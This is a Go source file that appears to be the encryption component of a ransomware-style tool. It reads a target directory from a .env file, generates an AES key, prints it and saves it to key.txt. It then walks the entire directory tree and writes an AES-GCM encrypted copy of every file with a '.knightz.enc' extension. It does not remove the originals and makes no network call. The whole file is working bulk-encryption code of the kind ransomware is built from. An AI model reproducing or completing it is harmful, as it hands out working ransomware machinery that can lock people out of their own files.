// <PROJECT_DIR>/subprocess/subprocess.go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
)

// Generates a random hexadecimal string for encryption key
func generateRandomHex(bits int) (string, error) {
	if bits%8 != 0 {
		log.Fatalf("Invalid number of bits: %d, must be divisible by 8", bits)
		return "", fmt.Errorf("Invalid number of bits: %d, must be divisible by 8", bits)
	}
	bytes := make([]byte, bits/8)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}

// Saves the given stringified data to a specified file
func saveStringToFile(filename string, data string) error {
	return os.WriteFile(filename, []byte(data), 0644)
}

// Encrypt the given file(specified by filename) in AES using the given key
func encryptFileAES(filepath string, key []byte) error {
	plaintext, err := os.ReadFile(filepath)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
		return err
	}

	aesBlock, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating AES block: %v", err)
		return err
	}

	aesGCM, err := cipher.NewGCM(aesBlock)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
		return err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		log.Fatalf("Error generating nonce: %v", err)
		return err
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	encryptedFilepath := filepath + ".knightz.enc"
	os.WriteFile(encryptedFilepath, ciphertext, 0644)
	return nil
}

func main() {
	// Load the environment variables from .env file to specify the target directory
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
		return
	}
	targetDirectoryAbsolutePath := os.Getenv("TARGET_ABSOLUTE_DIRPATH")
	if targetDirectoryAbsolutePath == "" {
		log.Fatalf("TARGET_ABSOLUTE_DIRPATH not found in .env file")
		return
	}

	// Generate AES key file
	randomHexString, err := generateRandomHex(128)
	if err != nil {
		log.Fatalf("Error generating random hex: %v", err)
	}

	fmt.Printf("Random hex: %s\n", randomHexString)

	filename := "key.txt"
	err = saveStringToFile(filename, randomHexString)
	if err != nil {
		log.Fatalf("Error saving to file: %v", err)
	}

	fmt.Printf("Random hex saved to %s\n", filename)

	// Start encryption to the target directory
	aesEncryptionKey, err := hex.DecodeString(randomHexString)
	if err != nil {
		log.Fatalf("Error decoding random hex: %v", err)
		return
	}

	err = filepath.Walk(targetDirectoryAbsolutePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			fmt.Printf("Encrypting file: %s\n", path)
			err = encryptFileAES(path, aesEncryptionKey)
			if err != nil {
				log.Fatalf("Error encrypting file: %v", err)
				return err
			}
			fmt.Printf("Encrypted file: %s\n", path)
		}
		return nil
	})

	if err != nil {
		log.Fatalf("Error walking through directory: %v", err)
		return
	}

	fmt.Println("Encryption completed successfully")
}
